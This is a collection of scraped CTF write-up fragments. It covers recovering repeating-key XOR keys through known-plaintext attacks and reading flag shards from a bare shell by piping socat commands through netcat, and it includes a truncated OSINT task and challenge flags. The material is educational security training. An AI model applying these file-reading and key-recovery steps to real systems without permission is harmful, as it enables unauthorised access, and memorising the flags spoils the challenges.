content: Recovering the Final Key Byte The final key byte, K4K_4K4​, cannot be recovered from the THM{ prefix because that prefix only contains four bytes. However, the complete known plaintext ends with the closing brace character, }. We can also verify that the ciphertext has a length of 40 bytes: >>> len(encrypted_flag) 40 Since the key length is five bytes, ciphertext positions that correspond to the fifth key byte satisfy: i mod 5=4i \bmod 5 = 4imod5=4 The final ciphertext byte is at index 39. Therefore: 39 mod 5=439 \bmod 5 = 439mod5=4 This means the final ciphertext byte was encrypted using K4K_4K4​. Since the final plaintext byte is known to be }, the missing key byte can be recovered as follows: >>> last_key_byte = bytes([encrypted_flag[-1] ^ ord("}")]) >>> print(last_key_byte) b'5' The complete encryption key is therefore: 1LoQ5
title: W1seGuy

content: Decrypting Flag 1 Now that the full key has been recovered, the ciphertext can be decrypted by repeating the key across the encrypted bytes: >>> full_key = b"1LoQ5" >>> plaintext = bytes( ... encrypted_flag[i] ^ full_key[i % len(full_key)] ... for i in range(len(encrypted_flag)) ... ) >>> print(plaintext.decode()) THM{thisisafakeflag}
title: W1seGuy

content: Retrieving Flag 2 Finally, submitting the recovered key to the server reveals the second flag. This challenge demonstrates why repeating-key XOR should not be used for encryption. When attackers know or can guess even a portion of the plaintext, they can recover the corresponding key bytes and potentially decrypt the entire message.
title: W1seGuy

content: TL;DR minfs is a misc challenge from BtS CTF. In this challenge a remote instance is given which must be accessed using snicat/sc .
title: minfs

content: Challenge Description In this challenge we are given a remote instance that must be accessed using snicat/sc . Challenge information: tcp-minfs-1b51ff5e33283ee0.chall.bts.wh.edu.pl Challenge provides hints: We are targeting a flag stored on a host with no utilities. Can you manage to get it? This indicates that the available environment is very minimal and most likely common Linux utilities such as cat , ls , id , and others are not available.
title: minfs

content: Initial Enumeration The connection is established using binary sc : ./sc tcp-minfs-1b51ff5e33283ee0.chall.bts.wh.edu.pl When trying common commands like: whoami id ls no output is provided. However, bash builtin commands such as help , echo , and printf still work. Examples: help The output indicates that the shell used is still based on the bash builtin.
title: minfs

content: Filesystem enumeration Since ls is not available, filesystem enumeration is performed using bash’s glob expansion: echo /* Output: /bin /dev /etc /flag /proc /sys The /flag directory looked interesting so further enumeration was carried out: echo /flag/* Output: /flag/shard_1.png /flag/shard_2.png ... /flag/shard_12.png There are 12 PNG files with the name shard_X.png .
title: minfs

content: Utilizing socat In this challenge Linux utility is very limited, but there is a binary socat . Enumeration /bin : echo * Output: bash socat This means that we can use socat as a replacement for utilities like cat .
title: minfs

content: Create a Local Tunnel To make it easier to interact with the challenge, bind mode from sc is used: ./sc -bind 3000 tcp-minfs-1b51ff5e33283ee0.chall.bts.wh.edu.pl Then the connection is made locally: nc localhost 3000 With this mechanism, all remote stdin/stdout are forwarded via the local socket.
title: minfs

content: Retrieve PNG Files Since socat is available, the file can be read directly to stdout: printf 'socat FILE:/flag/shard_1.png STDOUT ' | nc localhost 3000 > shard_1.png The entire shard is then retrieved using a loop: for i in {1..12}; do printf "socat FILE:/flag/shard_${i}.png STDOUT " | nc localhost 3000 > shard_${i}.png done File verification: file shard_*.png The output indicates all valid PNG files.
title: minfs

content: Combining Shards All images were then merged from left to right using Python and Pillow. Scripts: from PIL import Image files = [f"shard_{i}.png" for i in range(1, 13)] images = [Image.open(f) for f in files] total_width = sum(img.width for img in images) max_height = max(img.height for img in images) combined = Image.new("RGBA", (total_width, max_height)) x_offset = 0 for img in images: combined.paste(img, (x_offset, 0)) x_offset += img.width combined.save("flag_combined.png") The final result is one complete image.
title: minfs

content: Technical Analysis Image The merged image contains many decimal numbers. Examples: 116 83 84 66 67 ... The values are then converted to ASCII. Example: 116 -> t 83 -> S 84 -> T 66 -> B After all the numbers are converted to ASCII sequentially, a challenge flag is obtained. BtSCTF2026{00318f4bfrom_scratch_with_love3ff0e6b4}
title: minfs

content: TL;DR 📝 Writeup – OSINT: Reverse MX (Tick Tock) is an oint challenge from OSINT Combine. It is known that there are several domains that use the same mail server as Lufthansa. Of these domains, one of them has the name city in Bulgaria. Our task is to find the full domain.
title: 📝 Writeup – OSINT: Reverse MX (Tick Tock)

content: 📌 Question Description It is known that there are several domains that use the same mail server as Lufthansa. Of these domains, one of them has the name city in Bulgaria. Our task is to find the full domain.
title: 📝 Writeup – OSINT: Reverse MX (Tick Tock)

content: 🔍 Completion Steps

title: CTF Write-Up: Repeating-Key XOR & Known Plaintext Attack

content: 📌 Challenge Summary This cryptography challenge involves decrypting a ciphertext using the Known Plaintext Attack (KPA) method against the XOR cipher algorithm. By using pieces of text whose position is known (known plaintext), we can extract the key which is used to decrypt the entire file and get the flag.
title: CTF Write-Up: Repeating-Key XOR & Known Plaintext Attack

content: 🛠️ Methodology & Completion Steps
title: CTF Write-Up: Repeating-Key XOR & Known Plaintext Attack

content: 1. Analysis and Known Plaintext Attack (KPA) Based on initial analysis of the file structure, it is assumed that the document file begins with the opening sentence of the story A Scandal in Bohemia: "To Sherlock Holmes she is always the woman." The basic nature of the XOR operation is reversible ( Ciphertext ⊕ Plaintext = Key ). Since the length of this known plaintext is 43 characters, we can take the first 43 bytes of the ciphertext (in hexadecimal format) to XOR it: 1d 2e 69 12 21 24 3b 2d 26 22 22 61 01 2e 25 2c 2c 32 69 32 21 24 69 28 3a 61 28 2d 3e 20 30 32 69 35 21 24 69 36 26 2c 28 2f 67 By performing an XOR operation between the ciphertext and the known plaintext, we get a key stream result in the form of: "IAIAIAIAIAIAIAIAIAIAIAIAIAIAIAIAIAIAIAIAIAI" ### 2. Identify Keys From the XOR results in the first step, it is clear that there is a character pattern that continues to repeat itself constantly. This confirms that the algorithm used is a repeating-key XOR cipher with a key length of 2 bytes. So, the main key used for encryption is: ** "IA" **
title: CTF Write-Up: Repeating-Key XOR & Known Plaintext Attack

content: 3. Entire File Decryption and Flag Extraction After the key ( "IA" ) has been identified with certainty, the final step is to apply the XOR operation using the key to the entire ciphertext remaining in the file. This decryption process returns the original text intact. After reading it in its entirety, the flag is hidden and can be found on the very last line of the From the result decryption.
title: CTF Write-Up: Repeating-Key XOR & Known Plaintext Attack

content: 💻 Proof of Concept (PoC) Script To replicate this Known Plaintext Attack process and decrypt it automatically, here is a Python script using library pwntools : from pwn import xor # 1. Setup Data KPA enc_hex = "1d 2e 69 12 21 24 3b 2d 26 22 22 61 01 2e 25 2c 2c 32 69 32 21 24 69 28 3a 61 28 2d 3e 20 30 32 69 35 21 24 69 36 26 2c 28 2f 67" enc_bytes = bytes.fromhex(enc_hex) known_plaintext = b"To Sherlock Holmes she is always the woman." # 2. Ekstraksi Key Stream extracted_key_stream = xor(enc_bytes, known_plaintext) print(f"[*] Extracted Key Stream: {extracted_key_stream.decode()}") # 3. Dekripsi File (Asumsi file dibaca ke dalam variabel 'full_enc_data') key = b"IA" print(f"[*] Actual Key Identified: {key.decode()}") # full_enc_data = open('encrypted_file.txt', 'rb').read() # decrypted_data = xor(full_enc_data, key) # print(f"[*] Flag found: {decrypted_data.split(b'\n')[-1].decode()}")
